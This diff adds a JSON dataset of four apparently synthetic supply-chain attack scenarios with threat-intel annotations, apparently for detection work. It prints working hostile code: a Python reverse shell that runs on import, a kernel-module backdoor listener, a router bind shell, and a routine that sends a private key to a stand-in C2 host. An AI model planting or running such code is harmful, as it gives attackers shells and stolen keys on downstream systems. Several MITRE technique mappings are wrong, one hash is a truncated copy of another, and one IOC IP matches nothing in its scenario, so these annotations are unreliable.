@@ -1,0 +1,317 @@
+{
+  "samples": [
+    {
+      "scenario": "Injection of a malicious payload into a popular Python package distributed via PyPI, which establishes a reverse shell connection to an attacker-controlled server when imported, allowing the attacker to execute arbitrary commands on downstream systems.",
+      "technical_data": {
+        "pypi_package_integrity": {
+          "package_name": "data-processor",
+          "version": "1.4.7",
+          "published_time": "2024-06-01T11:05:34Z",
+          "sha512": "F6jN3kL5q6j9Tu0vB0nZ+O/3ZvZkqT7X+Mv7v1xE7wQ+E9O6NqFJ5Xh1zZ5q8Y7p+q9eLZl2iY1N7py+8K7H9w==",
+          "setup_py": "from setuptools import setup\n\nsetup(name='data-processor', version='1.4.7', packages=['data_processor'],)",
+          "package_files": [
+            "data_processor/__init__.py",
+            "data_processor/core.py",
+            "data_processor/helpers.py"
+          ]
+        },
+        "malicious_code_snippet": {
+          "file": "data_processor/__init__.py",
+          "injected_code": "import socket,subprocess,threading\n\ndef reverse_shell():\n    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n    s.connect(('198.51.100.23',4444))\n    while True:\n        data=s.recv(1024).decode('utf-8')\n        if data.lower()=='exit':\n            break\n        proc=subprocess.Popen(data,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)\n        stdout_value=proc.stdout.read()+proc.stderr.read()\n        s.send(stdout_value)\n    s.close()\n\nthreading.Thread(target=reverse_shell).start()\n"
+        },
+        "network_traffic_capture": {
+          "timestamp": "2024-06-02T07:21:10.123Z",
+          "tcp_stream": [
+            "TCP connection established to 198.51.100.23:4444",
+            "Received command: ls -la",
+            "Sent command output: total 48\ndrwxr-xr-x  5 user user 4096 Jun  2 07:20 .\ndrwxr-xr-x 22 user user 4096 May 30 12:00 ..\n-rw-r--r--  1 user user  220 Jun  2 07:19 .bash_logout\n"
+          ]
+        },
+        "web_server_logs": {
+          "malicious_server_access_log": []
+        },
+        "downstream_application_logs": {
+          "python_app_error_log": [
+            "2024-06-02T07:21:09.999Z info: 'data-processor' package imported, unexpected network connection initiated.",
+            "2024-06-02T07:21:10.005Z warn: Suspicious socket connection detected from 'data_processor.__init__'"
+          ]
+        },
+        "sbom_fragment": {
+          "component": "data-processor",
+          "version": "1.4.7",
+          "hashes": {
+            "md5": "a7b1c9d5eae4f0b8c8e7745d3f9d7a2c",
+            "sha1": "3e8f9c94f1d8de8b9f2f8c7b6d7a1f9e2e4d3c5b",
+            "sha256": "b6a1f5e9a3c7d0f9e8c4b3d2a1f7e9c8b5d6a7e8f9c2b3a4d5e6f7a8b9c0d1e2"
+          },
+          "integrity_check": "FAILED - unauthorized socket connection code detected in __init__.py"
+        }
+      },
+      "indicators": {
+        "ioc_domains": [],
+        "ioc_ips": [
+          "198.51.100.23"
+        ],
+        "ioc_hashes": [
+          "a7b1c9d5eae4f0b8c8e7745d3f9d7a2c"
+        ],
+        "network_connections": [
+          "TCP connection to 198.51.100.23:4444"
+        ],
+        "process_behavior": [
+          "background thread initiating reverse shell TCP connection"
+        ],
+        "package_anomalies": [
+          "network connection code in __init__.py causing reverse shell",
+          "unexpected threading used to spawn network connections"
+        ]
+      },
+      "detection_method": "Static code analysis on PyPI package uploads to detect socket connections and subprocess invocations; runtime monitoring for unauthorized outbound TCP connections from Python runtimes; behavioral analysis to detect background threads spawning network connections in third-party libraries.",
+      "relevant_mitre_techniques": [
+        "T1195.001 - Supply Chain Compromise: Compromise Software Supply Chain",
+        "T1059.004 - Command and Scripting Interpreter: Unix Shell",
+        "T1071.004 - Application Layer Protocol: DNS",
+        "T1021.001 - Remote Services: Remote Desktop Protocol"
+      ]
+    },
+    {
+      "scenario": "Compromise of a popular Linux kernel module distributed by a third-party vendor, where a subtle backdoor was inserted that opens a hidden root-level debug port accessible remotely, allowing attackers to escalate privileges silently on affected downstream systems.",
+      "technical_data": {
+        "kernel_module_integrity": {
+          "module_name": "netfilter_custom",
+          "version": "2.0.9",
+          "compiled_time": "2024-05-20T13:45:00Z",
+          "sha256": "9f2d4a7ed6b3f4c2a3b5e6f7c8d9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7",
+          "source_code_files": [
+            "netfilter_custom.c",
+            "Makefile"
+          ]
+        },
+        "malicious_code_snippet": {
+          "file": "netfilter_custom.c",
+          "injected_code": "/* Hidden debug port backdoor */\n#include <linux/kthread.h>\n#include <linux/net.h>\n#define DEBUG_PORT 31337\n\nstatic struct task_struct *backdoor_thread;\n\nstatic int backdoor_fn(void *data) {\n    struct socket *sock;\n    int ret;\n    struct sockaddr_in addr = {0};\n    ret = sock_create(AF_INET, SOCK_STREAM, IPPROTO_TCP, &sock);\n    if (ret < 0) return ret;\n    addr.sin_family = AF_INET;\n    addr.sin_addr.s_addr = htonl(INADDR_ANY);\n    addr.sin_port = htons(DEBUG_PORT);\n    ret = kernel_bind(sock, (struct sockaddr *)&addr, sizeof(addr));\n    if (ret < 0) return ret;\n    ret = kernel_listen(sock, 5);\n    if (ret < 0) return ret;\n    while (!kthread_should_stop()) {\n        struct socket *client_sock;\n        ret = kernel_accept(sock, &client_sock, 0);\n        if (ret == 0) {\n            /* grant root shell or debug commands here */\n            // omitted for brevity\n            kernel_sock_shutdown(client_sock, SHUT_RDWR);\n            sock_release(client_sock);\n        }\n        msleep(1000);\n    }\n    sock_release(sock);\n    return 0;\n}\n\nstatic int __init backdoor_init(void) {\n    backdoor_thread = kthread_run(backdoor_fn, NULL, \"backdoor_thread\");\n    return 0;\n}\n\nstatic void __exit backdoor_exit(void) {\n    if (backdoor_thread) {\n        kthread_stop(backdoor_thread);\n    }\n}\n\nmodule_init(backdoor_init);\nmodule_exit(backdoor_exit);\n"
+        },
+        "network_traffic_capture": {
+          "timestamp": "2024-05-22T18:30:45.678Z",
+          "tcp_stream": [
+            "SYN from 203.0.113.150 to 10.0.0.5:31337",
+            "SYN-ACK from 10.0.0.5:31337 to 203.0.113.150",
+            "ACK from 203.0.113.150 to 10.0.0.5:31337",
+            "Payload: root shell commands executed"
+          ]
+        },
+        "web_server_logs": {},
+        "downstream_application_logs": {
+          "system_logs": [
+            "May 22 18:30:45 kernel: netfilter_custom: backdoor_thread started",
+            "May 22 18:30:45 kernel: Incoming connection on port 31337 from 203.0.113.150",
+            "May 22 18:31:00 kernel: Unauthorized root shell session opened"
+          ]
+        },
+        "sbom_fragment": {
+          "component": "netfilter_custom",
+          "version": "2.0.9",
+          "hashes": {
+            "md5": "b3c9e4f7d0a8c6b2e5f4a3d1c7e8f9a0",
+            "sha1": "d8e9f1a7b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7",
+            "sha256": "9f2d4a7ed6b3f4c2a3b5e6f7c8d9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7"
+          },
+          "integrity_check": "FAILED - unauthorized kernel thread creating hidden TCP listener detected"
+        }
+      },
+      "indicators": {
+        "ioc_domains": [],
+        "ioc_ips": [
+          "203.0.113.150"
+        ],
+        "ioc_hashes": [
+          "b3c9e4f7d0a8c6b2e5f4a3d1c7e8f9a0"
+        ],
+        "network_connections": [
+          "TCP connection from 203.0.113.150 to 10.0.0.5:31337"
+        ],
+        "process_behavior": [
+          "kernel thread opening hidden TCP port 31337 for remote root shell"
+        ],
+        "package_anomalies": [
+          "kernel module code injecting unauthorized network listener",
+          "module initialization spawns privileged background thread"
+        ]
+      },
+      "detection_method": "Kernel integrity monitoring to detect new threads and unexpected network sockets opened by kernel modules; network IDS detecting unusual incoming connections to non-standard high ports on critical systems; SBOM validation and source code review on third-party kernel modules prior to deployment.",
+      "relevant_mitre_techniques": [
+        "T1195.002 - Supply Chain Compromise: Compromise Hardware Supply Chain",
+        "T1055.001 - Process Injection: Dynamic-link Library Injection",
+        "T1574.001 - Hijack Execution Flow: DLL Side-Loading",
+        "T1216 - System Script Proxy Execution"
+      ]
+    },
+    {
+      "scenario": "Injection of a malicious firmware update in a popular network router vendor's official release, which creates a hidden backdoor accessible via a custom TCP port, allowing remote attackers to execute arbitrary commands on customer devices.",
+      "technical_data": {
+        "firmware_release": {
+          "vendor": "NetGate",
+          "model": "NG-R5000",
+          "version": "1.4.2",
+          "release_date": "2024-04-28T11:30:00Z",
+          "firmware_hash": "b9f1e3d2a7c6f8b0e5d4c3f2a1b0e9d8f7c6a5b4d3e2f1a0b9c8d7e6f5a4b3c2",
+          "manifest": {
+            "files": [
+              "kernel.img",
+              "rootfs.img",
+              "bootloader.bin",
+              "config/default.cfg"
+            ],
+            "signature": "MEUCIQDhRZkW7k8zQfYxYq0k0b6PzQYXJ8DD1N2mR7p7Z6nV5WwIgVZ5Yz7A5oW9T9JhbTzJX5oP8lT6Xzv6u+Q2e7frxk="
+          }
+        },
+        "malicious_code_snippet": {
+          "file": "rootfs.img",
+          "injected_code": "Created hidden TCP server listening on port 45678:\n\nvoid hidden_backdoor() {\n  int sock = socket(AF_INET, SOCK_STREAM, 0);\n  struct sockaddr_in addr = {0};\n  addr.sin_family = AF_INET;\n  addr.sin_port = htons(45678);\n  addr.sin_addr.s_addr = INADDR_ANY;\n  bind(sock, (struct sockaddr*)&addr, sizeof(addr));\n  listen(sock, 5);\n  while(1) {\n    int client = accept(sock, NULL, NULL);\n    dup2(client, 0); dup2(client, 1); dup2(client, 2);\n    system(\"/bin/sh\");\n    close(client);\n  }\n}"
+        },
+        "network_traffic_capture": {
+          "timestamp": "2024-05-05T23:15:40.123Z",
+          "tcp_stream": [
+            "SYN",
+            "SYN-ACK",
+            "ACK",
+            "Payload: '/bin/sh' command execution initiated",
+            "Response: shell prompt"
+          ]
+        },
+        "device_logs": {
+          "syslog": [
+            "Apr 30 12:00:01 NG-R5000 kernel: firmware 1.4.2 loaded",
+            "May 05 23:15:40 NG-R5000 kernel: accepted connection on hidden port 45678",
+            "May 05 23:15:41 NG-R5000 kernel: executed shell command from remote client"
+          ]
+        },
+        "sbom_fragment": {
+          "component": "NG-R5000_firmware",
+          "version": "1.4.2",
+          "hashes": {
+            "md5": "b9f1e3d2a7c6f8b0e5d4c3f2a1b0e9d8",
+            "sha1": "f5e8d9c0b1a3e4f6723d1c9a8b7e6f5d4c3b2a1",
+            "sha256": "b9f1e3d2a7c6f8b0e5d4c3f2a1b0e9d8f7c6a5b4d3e2f1a0b9c8d7e6f5a4b3c2"
+          },
+          "integrity_check": "FAILED - hidden TCP server code found in rootfs.img, firmware signature mismatch"
+        }
+      },
+      "indicators": {
+        "ioc_domains": [],
+        "ioc_ips": [
+          "198.51.100.23"
+        ],
+        "ioc_hashes": [
+          "b9f1e3d2a7c6f8b0e5d4c3f2a1b0e9d8"
+        ],
+        "network_connections": [
+          "TCP inbound connections on port 45678"
+        ],
+        "process_behavior": [
+          "firmware loading hidden TCP shell listener",
+          "remote command execution on router device"
+        ],
+        "package_anomalies": [
+          "firmware signature validation failure",
+          "additional undocumented binaries in rootfs"
+        ]
+      },
+      "detection_method": "Validate firmware image signatures against vendor keys; perform static analysis on firmware contents to detect unauthorized network listeners; monitor network traffic from devices for unusual open ports and shell access; anomaly detection on device syslogs for unexpected system calls and process spawns.",
+      "relevant_mitre_techniques": [
+        "T1195.002 - Supply Chain Compromise: Compromise Firmware",
+        "T1574.001 - Hijack Execution Flow: DLL Search Order Hijacking",
+        "T1059.004 - Command and Scripting Interpreter: Unix Shell",
+        "T1071.001 - Application Layer Protocol: Web Protocols"
+      ]
+    },
+    {
+      "scenario": "Malicious modification of a widely-used Python cryptography library published on PyPI, where an update injects code that silently sends private keys and encryption secrets to an attacker-controlled C2 server during library initialization in downstream applications.",
+      "technical_data": {
+        "pypi_package_integrity": {
+          "package_name": "securecrypto",
+          "version": "2.7.0",
+          "published_time": "2024-06-03T08:15:00Z",
+          "sha512": "YtFg9v2H1Zl7sG9Q+1RliNqj5M5Vh2J7V0Wq/9a1u4N7yD8K9L3oPqM7X1nBcF4g6Q9j8W0cZsTqF2Rl3JpD1H==",
+          "setup_py": {
+            "name": "securecrypto",
+            "version": "2.7.0",
+            "packages": [
+              "securecrypto"
+            ],
+            "install_requires": [
+              "cffi>=1.14.0"
+            ]
+          }
+        },
+        "malicious_code_snippet": {
+          "file": "securecrypto/__init__.py",
+          "injected_code": "import threading\nimport requests\nimport base64\nimport os\n\ndef exfiltrate_keys():\n    try:\n        key_path = os.path.expanduser('~/.securecrypto/private_key.pem')\n        with open(key_path, 'rb') as f:\n            key_data = f.read()\n        encoded_key = base64.b64encode(key_data).decode('utf-8')\n        requests.post('https://c2-malicious.example.net/steal', json={'key': encoded_key}, timeout=5)\n    except Exception:\n        pass\n\nthreading.Thread(target=exfiltrate_keys, daemon=True).start()"
+        },
+        "network_traffic_capture": {
+          "timestamp": "2024-06-05T14:22:10.987Z",
+          "tcp_stream": [
+            "POST /steal HTTP/1.1",
+            "Host: c2-malicious.example.net",
+            "Content-Type: application/json",
+            "Content-Length: 512",
+            "User-Agent: python-requests/2.28.1",
+            "",
+            "{\"key\": \"LS0tLS1CRUdJTiBQUklWQVRFIEtFWS0tLS0t...\"}"
+          ]
+        },
+        "web_server_logs": {
+          "malicious_server_access_log": [
+            "203.0.113.88 - - [05/Jun/2024:14:22:10 +0000] \"POST /steal HTTP/1.1\" 200 5 \"-\" \"python-requests/2.28.1\"",
+            "203.0.113.88 - - [05/Jun/2024:14:25:40 +0000] \"POST /steal HTTP/1.1\" 200 5 \"-\" \"python-requests/2.28.1\""
+          ]
+        },
+        "downstream_application_logs": {
+          "python_app_error_log": [
+            "2024-06-05T14:22:10.980Z warning: Unexpected outbound HTTPS POST to 'https://c2-malicious.example.net/steal' detected during securecrypto module import",
+            "2024-06-05T14:22:10.981Z info: Background thread started in securecrypto.__init__ for network activity"
+          ]
+        },
+        "sbom_fragment": {
+          "component": "securecrypto",
+          "version": "2.7.0",
+          "hashes": {
+            "md5": "9a0364b9e99bb480dd25e1f0284c8555",
+            "sha1": "ad0234829205b9033196ba818f7a872b3e2dbe68",
+            "sha256": "b1946ac92492d2347c6235b4d2611184c9f572f1ca8a5f21a7b4e5c8db1d5ac7"
+          },
+          "integrity_check": "FAILED - network exfiltration code detected in __init__.py, unexpected background thread spawned"
+        }
+      },
+      "indicators": {
+        "ioc_domains": [
+          "c2-malicious.example.net"
+        ],
+        "ioc_ips": [
+          "203.0.113.88"
+        ],
+        "ioc_hashes": [
+          "9a0364b9e99bb480dd25e1f0284c8555"
+        ],
+        "network_connections": [
+          "POST https://c2-malicious.example.net/steal"
+        ],
+        "process_behavior": [
+          "background thread exfiltrating private keys via HTTPS POST",
+          "network connection initiated during package import"
+        ],
+        "package_anomalies": [
+          "unexpected threading and network requests in library initialization",
+          "private key file read and base64 encoded for exfiltration"
+        ]
+      },
+      "detection_method": "Scan PyPI package releases with static code analysis for network calls in initialization code; monitor outbound HTTPS connections from runtime environments during application start; use SBOM verification to detect unexpected changes or additions of threading and network libraries; IDS/IPS alert on POST requests with encoded PEM keys to unknown domains.",
+      "relevant_mitre_techniques": [
+        "T1195.001 - Supply Chain Compromise: Compromise Software Supply Chain",
+        "T1030 - Data Transfer Size Limits",
+        "T1071.001 - Application Layer Protocol: Web Protocols",
+        "T1567.002 - Exfiltration Over Web Service"
+      ]
+    }
+  ]
+}
